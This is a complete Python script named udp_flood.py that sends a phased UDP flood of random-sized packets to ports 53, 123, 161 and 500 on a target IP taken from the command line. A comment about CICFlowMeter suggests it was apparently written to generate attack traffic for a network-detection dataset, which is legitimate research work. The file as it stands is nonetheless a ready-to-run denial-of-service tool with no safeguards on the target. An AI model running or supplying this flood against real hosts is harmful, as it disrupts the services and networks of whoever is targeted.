#!/usr/bin/env python3
import socket
import random
import time
import sys
import os


def attack_profile(duration):
    start = time.time()
    while True:
        elapsed = time.time() - start
        if elapsed > duration:
            break

        phase = elapsed / duration

        if phase < 0.3:
            intensity = 0.3
        elif phase < 0.7:
            intensity = 1.0
        else:
            intensity = 0.4

        yield intensity


def gaussian_payload():
    size = int(random.gauss(650, 250))
    size = max(64, min(size, 1400))
    return os.urandom(size)


def udp_flood(target_ip, duration):

    base_rate = 800
    peak_rate = 2500

    total_flows = 60000
    flows_created = 0

    start = time.time()

    for intensity in attack_profile(duration):

        if flows_created >= total_flows:
            break

        current_rate = base_rate + (peak_rate - base_rate) * intensity

        try:
            # Create real UDP socket (kernel chooses source IP)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            # Optional: random high source port
            s.bind(("", random.randint(20000, 65000)))

            payload = gaussian_payload()

            # Send twice so CICFlowMeter counts flow
            s.sendto(payload, (target_ip, random.choice([53, 123, 161, 500])))
            s.sendto(payload, (target_ip, random.choice([53, 123, 161, 500])))

            s.close()
            flows_created += 1

        except:
            pass

        sleep_time = max(0.0002, 1.0 / current_rate)
        sleep_time *= random.uniform(0.7, 1.3)
        time.sleep(sleep_time)

    print(f"Approx UDP flows generated: {flows_created}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: udp_flood.py <target_ip> <duration>")
        sys.exit(1)

    udp_flood(sys.argv[1], int(sys.argv[2]))